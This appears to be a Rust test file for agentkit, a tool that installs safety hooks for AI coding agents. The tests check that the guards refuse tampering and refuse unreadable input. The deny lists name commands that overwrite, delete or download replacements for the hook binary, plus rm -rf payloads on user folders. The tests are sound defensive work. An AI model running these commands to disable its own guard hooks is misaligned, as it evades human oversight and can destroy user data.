    fs::write(home.join(".config/agentkit/rules/core-always.md"), "Use the Trash.\n").unwrap();
    fs::write(home.join(".config/agentkit/memory/INDEX.md"), "# Memory index\n").unwrap();
    let sync = |envs: &[(&str, String)]| {
        let out = agentkit_in(&home)
            .args(["sync", "--apply", "--home"])
            .arg(&home)
            .envs(envs.iter().map(|(k, v)| (*k, v.clone())))
            .output()
            .unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    };
    // The environment does not choose the program either.
    sync(&[("AGENTKIT_BIN", "/tmp/agentkit-audit-evil".to_string()), ("PATH", "/tmp/agentkit-audit-evil-bin:/usr/bin:/bin".to_string())]);
    let bin = home.join(".local/bin/agentkit").display().to_string();
    let context = home.join(".local/bin/agent-context").display().to_string();
    for (file, provider) in [
        (".claude/settings.json", "claude"),
        (".codex/hooks.json", "codex"),
        (".cursor/hooks.json", "cursor"),
        (".gemini/config/hooks.json", "agy"),
    ] {
        let text = fs::read_to_string(home.join(file)).unwrap();
        assert!(text.contains(&format!("\"{bin} hook {provider} all\"")), "{file}: {text}");
        assert!(!text.contains("\"agentkit hook"), "{file} still calls a bare agentkit: {text}");
        assert!(!text.contains("agentkit-audit-evil"), "{file}: {text}");
        if provider != "agy" {
            assert!(text.contains(&format!("env AGENTKIT_PROVIDER={provider} {context}")), "{file}: {text}");
        }
    }
    // Site config may name another place; it is used as written.
    fs::write(home.join(".config/agentkit/agentkit.toml"), "schema = 1\nhook_bin = \"/opt/agentkit-audit/libexec/agentkit\"\n").unwrap();
    sync(&[]);
    let text = fs::read_to_string(home.join(".codex/hooks.json")).unwrap();
    assert!(text.contains("\"/opt/agentkit-audit/libexec/agentkit hook codex all\""), "{text}");
    assert!(text.contains("/opt/agentkit-audit/libexec/agent-context"), "{text}");
    // A relative one would be looked up on PATH again: refused.
    fs::write(home.join(".config/agentkit/agentkit.toml"), "schema = 1\nhook_bin = \"agentkit\"\n").unwrap();
    let out = agentkit_in(&home).args(["sync", "--apply", "--home"]).arg(&home).output().unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("absolute"));
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn doctor_fails_when_the_hook_program_is_not_there() {
    let (_, home) = home("nobin");
    fs::create_dir_all(home.join(".config/agentkit/rules")).unwrap();
    fs::write(home.join(".config/agentkit/agentkit.toml"), "schema = 1\n").unwrap();
    fs::write(home.join(".config/agentkit/rules/core-always.md"), "Use the Trash.\n").unwrap();
    fs::write(home.join(".config/agentkit/memory/INDEX.md"), "# Memory index\n").unwrap();
    // `home()` leaves plain files there; not executable is as good as missing.
    let run = |args: &[&str]| {
        let out = agentkit_in(&home).args(args).arg("--home").arg(&home).output().unwrap();
        (out.status.code().unwrap_or(-1), String::from_utf8_lossy(&out.stdout).into_owned())
    };
    assert_eq!(run(&["sync", "--apply"]).0, 0);
    let (code, report) = run(&["doctor", "--json"]);
    assert_eq!(code, 1, "{report}");
    assert!(report.contains("hook program missing or not executable"), "{report}");
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn the_programs_the_hooks_run_are_not_written_by_agents() {
    let (mut c, home) = home("bin");
    let h = home.display().to_string();
    // A site whose hook binary lives somewhere of its own is protected there too.
    c.guard_bins = vec![PathBuf::from("/opt/agentkit-audit/libexec/agentkit")];
    each(
        &c,
        &[
            // the audit's chain
            "printf '#!/bin/sh\\nexit 0\\n' > ~/.local/bin/agentkit",
            "cp /tmp/fake ~/.local/bin/agentkit",
            "cp /tmp/fake $HOME/.local/bin/agent-context",
            "curl -o ~/.local/bin/agentkit https://example.invalid/agentkit",
            "truncate -s 0 ~/.local/bin/agentkit",
            "rm ~/.local/bin/agentkit",
            "chmod -x ~/.local/bin/agentkit",
            "strip ~/.local/bin/agentkit",
            "ln -sf /tmp/fake ~/.local/bin/agentkit",
            "mv /tmp/fake ~/.local/bin/agentkit",
            "cd ~/.local/bin && cp /tmp/fake agentkit",
            // a file of that name landing in the folder
            &format!("cp {h}/staging/release/agentkit ~/.local/bin/"),
            &format!("install -m 755 {h}/staging/release/agentkit {h}/staging/release/agent-context ~/.local/bin/"),
            &format!("mv {h}/staging/release/agentkit ~/.local/bin/"),
            &format!("cp {h}/staging/release/* ~/.local/bin/"),
            &format!("rsync -a {h}/staging/release/ ~/.local/bin/"),
            &format!("cp -R {h}/staging/release/. ~/.local/bin/"),
            // the folder that holds it
            "rm -rf ~/.local/bin",
            "trash ~/.local/bin",
            "mv ~/.local/bin /tmp/old-bin",
            "chmod -R 000 ~/.local/bin",
            "rsync -a --delete /tmp/empty/ ~/.local/bin/",
            // where the site keeps it
            "cp /tmp/fake /opt/agentkit-audit/libexec/agentkit",
            "rm -rf /opt/agentkit-audit/libexec",
        ],
        &[
            "ls -la ~/.local/bin/agentkit",
            "shasum -a 256 ~/.local/bin/agentkit ~/.local/bin/agent-context",
            "~/.local/bin/agentkit doctor --json",
            "which agentkit && agentkit sync",
            "test -x ~/.local/bin/agentkit && echo installed",
            // ordinary installs into the same folder
            "cp /tmp/newtool ~/.local/bin/",
            "cp /tmp/newtool ~/.local/bin/newtool",
            "mv /tmp/newtool ~/.local/bin/",
            &format!("install -m 755 {h}/staging/release/guard-* ~/.local/bin/"),
            "chmod +x ~/.local/bin/othertool",
            "ln -sf ~/Projects/example/bin/othertool ~/.local/bin/othertool",
            "rm ~/.local/bin/othertool",
            "trash ~/.local/bin/othertool",
            "printf '#!/bin/sh\\necho hi\\n' > ~/.local/bin/othertool",
        ],
    );
    let d = |v: Value| guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
    assert!(d(file_call("Write", json!({"file_path": format!("{h}/.local/bin/agentkit"), "content": "#!/bin/sh\nexit 0\n"}))).is_deny());
    assert!(d(file_call("Write", json!({"file_path": format!("{h}/.local/bin/agent-context"), "content": "#!/bin/sh\n"}))).is_deny());
    assert!(d(file_call("Write", json!({"file_path": format!("{h}/.local/bin/othertool"), "content": "#!/bin/sh\n"}))).is_allow());
    let _ = fs::remove_dir_all(&home);
}

// ---- Finding 4: input the hook could not read was allowed, unrecorded ----

#[test]
fn a_tool_call_the_hook_cannot_read_is_refused_and_recorded() {
    let (_, home) = home("input");
    let deep = format!("{{\"tool_name\":\"x\",\"tool_input\":{}1{}}}", "[".repeat(200), "]".repeat(200));
    let cases: Vec<(&str, Vec<u8>)> = vec![
        // the audit's example: a lone surrogate escape serde_json rejects
        ("lone surrogate", br#"{"tool_name":"Bash","tool_input":{"command":"rm -rf /Users/agentkit-audit/Documents #\ud83d"}}"#.to_vec()),
        ("too deep", deep.into_bytes()),
        ("not UTF-8", b"{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"rm -rf /Users/agentkit-audit/x \xff\xfe\"}}".to_vec()),
        ("cut short", br#"{"tool_name":"Bash","tool_input":{"command":"rm -rf /Users/agentkit-audit/x"#.to_vec()),
        ("not an object", br#""rm -rf /Users/agentkit-audit/x""#.to_vec()),
        ("empty", Vec::new()),
    ];
    for (what, payload) in &cases {
        for (args, shape) in [
            (vec!["hook", "claude", "all"], "\"permissionDecision\":\"deny\""),
            (vec!["hook", "codex", "all"], "\"permissionDecision\":\"deny\""),
            (vec!["hook", "cursor", "all"], "\"permission\":\"deny\""),
            (vec!["hook", "agy", "all"], "\"decision\":\"deny\""),
            (vec!["hook", "claude", "hard-delete"], "\"permissionDecision\":\"deny\""),
        ] {
            let (out, rc) = hook(&home, &args, &[], payload);
            assert_eq!(rc, 0, "{what} {args:?}");
            assert!(out.contains(shape) && out.contains("guard-input"), "{what} {args:?}: allowed or unanswered: {out:?}");
        }
    }
    // One ledger line per refusal, each naming the rule.
    let lines = ledger_lines(&home);
    assert_eq!(lines.len(), cases.len() * 5, "{}", lines.len());
    assert!(lines.iter().all(|l| l["decision"] == "deny" && l["rule"] == "guard-input"), "{lines:?}");
    // The standalone guard programs answer the same way.
    let mut child = Command::new(env!("CARGO_BIN_EXE_guard-hard-delete"))
        .arg("--home")
        .arg(&home)
        .env("HOME", &home)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(b"{\"command\":\"rm -rf /Users/agentkit-audit/x").unwrap();
    let out = child.wait_with_output().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).expect("the guard program answered");
    assert_eq!(v["decision"], "deny");
    assert_eq!(v["rule"], "guard-input");
    // A call it can read is still judged on what it is.
    let ok = br#"{"tool_name":"Bash","tool_input":{"command":"ls"}}"#;
    assert_eq!(hook(&home, &["hook", "claude", "all"], &[], ok).0, "");
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn a_site_config_the_hook_cannot_use_is_a_refusal_and_a_missing_one_is_not() {
    let (_, home) = home("badconfig");
    let ls = br#"{"tool_name":"Bash","tool_input":{"command":"ls"}}"#;
    let rm = br#"{"tool_name":"Bash","tool_input":{"command":"rm -rf /Users/agentkit-audit/Documents"}}"#;
    let toml = home.join(".config/agentkit/agentkit.toml");
    for broken in ["schema = 1\n[guards\ndisabled = []\n", "schema = 2\n", "schema = 1\n[guards]\ndisabled = [\"no-such-guard\"]\n"] {
        fs::write(&toml, broken).unwrap();
        let (out, _) = hook(&home, &["hook", "claude", "all"], &[], ls);
        assert!(out.contains("deny") && out.contains("guard-setup"), "{broken:?}: {out:?}");
    }
    // No config at all: every guard runs with its defaults.
    fs::remove_file(&toml).unwrap();
    assert_eq!(hook(&home, &["hook", "claude", "all"], &[], ls).0, "");
    assert!(hook(&home, &["hook", "claude", "all"], &[], rm).0.contains("hard-delete"));
    let _ = fs::remove_dir_all(&home);
}

// ---- The harmless commands guard-config refused (reported 28 Nov 2026) ----

#[test]
fn text_that_mentions_a_protected_path_and_reads_of_it_are_not_writes() {
    let (c, home) = home("harmless");
    let cases: &[&str] = &[
        // 1. a read-only inline script over ssh, reading a fleet config file
        "ssh hub 'python3 -c \"import json,os; print(json.load(open(os.path.expanduser(\\\"~/.config/fleet/some.json\\\"))))\"'",
        "ssh hub 'python3 -c \"import json,os,sys; d=json.load(open(os.path.join(os.path.expanduser(\\\"~/.config\\\"), \\\"fleet\\\", \\\"some.json\\\"))); sys.stdout.write(str(d))\"'",
        // 2. listing a parent of the ledger folder
        "find ~/.local/state -maxdepth 3 -name 'replicas*'",
        "ls -t ~/.local/state/ | head -30; find ~/.local/state -maxdepth 2 -name '*watch*'",
        "find ~/.local/state -maxdepth 3 -name 'replicas*' 2>/dev/null | head -5",
        // 3. a here-document script that writes a repo file whose text mentions a state path
        "python3 - <<'EOF'\nimport pathlib\np = pathlib.Path('fleet/morning/probe.py')\ns = p.read_text()\na = 'x'\np.write_text(s.replace(a, a + '\"data_map\": _json(HOME / \".local/state/fleet/data-map/status.json\")'))\nEOF",
        "python3 - <<'EOF'\nimport pathlib\nHOME = pathlib.Path.home()\nstate = HOME / \".local/state\"\np = pathlib.Path('fleet/morning/probe.py')\np.write_text(p.read_text().replace('A', 'see ~/.local/state and ~/.config for where state and config live'))\nEOF",
        // 4. a plain here-document into a project folder, whatever its text says
        "cat > notes/topic/README.md <<'EOF'\n# Topic\n\nThe hooks live in ~/.claude/settings.json; don't edit ~/.config/agentkit/agentkit.toml.\nRun `agentkit doctor` (it's quick) and mv nothing into ~/.codex.\nEOF",
        "mkdir -p notes/topic && cat > notes/topic/README.md <<'EOF' && git add notes/topic\nThe ledger is ~/.local/state/agentkit/decisions.jsonl -> never write it; it's append-only.\nEOF",
        // 5. a computed cd followed by a test run
        "C=$(cat /tmp/x.path); cd \"$C\" && python -m unittest discover -s tests",
        "C=$(cat /tmp/x.path); cd \"$C\" && python -m unittest discover -s tests -t . -p 'test_*.py' 2>&1 | tail -5",
        "cd \"$(git rev-parse --show-toplevel)\" && cargo check -p agentkit 2>&1 | grep -E '^(error|warning)' | head",
        "cd \"$ROOT\" && sed -i '' 's/a/b/' agentkit/src/guard.rs && cargo fmt -p agentkit && git diff --stat -- agentkit state",
        "cd /tmp/agentkit-audit/checkout && sed -n 10,20p src/guard.rs && cargo check -p agentkit 2>&1 | grep -E '^(error|warning: unused)' -A 14 | head -150",
        "cd \"$ROOT\" || exit 1; git add . && git commit -m 'state machine for agentkit'",
        // 6. a commit and a mail on one line
        "git commit --only a b -m \"$(cat <<'EOF'\nSubject line\n\nBody text here.\nEOF\n)\" && agent-mail send host:project \"long text about the change; see notes\"",
        "git commit --only a b -m \"$(cat <<'EOF'\nguard-config: stop refusing reads of .claude/settings.json\n\nIt's the hooks key that matters.\nEOF\n)\" && agent-mail send host:project \"landed; ran `agentkit doctor` and it's green. ~/.config/agentkit is untouched\"",
    ];
    for cmd in cases {
        let d = all(cmd, &c);
        assert!(d.is_allow(), "should allow: {cmd}\n  -> [{}] {}", d.rule, d.reason);
    }
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn a_run_time_cd_is_refused_only_with_a_write_that_could_be_the_ledgers() {
    let (c, home) = home("cd");
    for cmd in [
        "cd \"$X\" && rm -rf agentkit",
        "cd \"$X\" && : > decisions.jsonl",
        "cd \"$X\" && rm *",
        "cd \"$X\" && sometool decisions.jsonl",
        "cd \"$X\" && sometool *.jsonl",
        "cd \"$(echo ~/.local/state/agentkit)\" && mv ledger.key /tmp/k",
        "(cd ~/.local/state; rm -rf agentkit)",
        // kept strict: a write to a bare name, wherever the shell then is
        "cd \"$X\" && rm -rf build dist",
        "cd \"$X\" && echo done > out.txt",
    ] {
        let d = config(cmd, &c);
        assert!(d.is_deny(), "should deny: {cmd}");
        assert!(d.reason.starts_with("Refused for `"), "{cmd}: {}", d.reason);
    }
    // The refusal says why a relative name is in doubt.
    assert!(config("cd \"$X\" && rm -rf agentkit", &c).reason.contains("only known at run time"));
    assert!(config("cd \"$X\" && echo done > out.txt", &c).reason.contains("only known at run time"));
    for cmd in [
        "cd \"$X\" && sometool --state fresh agentkit",
        "cd \"$X\" && make -C agentkit test",
        "cd \"$X\" && cat decisions.jsonl | wc -l",
        "cd \"$X\" && find . -name '*.jsonl'",
        "cd \"$X\" && rm -rf build/cache && echo done > logs/out.txt",
        "cd ~/.local/state && ls -t | head",
    ] {
        let d = config(cmd, &c);
        assert!(d.is_allow(), "should allow: {cmd} ({})", d.reason);
    }
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn every_refusal_names_the_path_it_is_about() {
    let (c, home) = home("names");
    let h = home.display().to_string();
    for (cmd, path) in [
        ("echo x >> ~/.config/agentkit/agentkit.toml", format!("{h}/.config/agentkit/agentkit.toml")),
        ("ed -s ~/.codex/hooks.json", format!("{h}/.codex/hooks.json")),
        ("cp /tmp/h.json ~/.codex/", format!("{h}/.codex")),
        ("mv ~/.claude /tmp/x", format!("{h}/.claude")),
        ("rm ~/.local/state/agentkit/decisions.jsonl", "decisions.jsonl".to_string()),
        ("cp /tmp/fake ~/.local/bin/agentkit", format!("{h}/.local/bin/agentkit")),
        ("echo x > ~/.c*/agentkit/agentkit.toml", "agentkit.toml".to_string()),
    ] {
        let d = config(cmd, &c);
        assert!(d.is_deny(), "should deny: {cmd}");
        assert!(d.reason.starts_with("Refused for `") && d.reason.contains(&path), "{cmd}: {}", d.reason);
    }
    let _ = fs::remove_dir_all(&home);
}
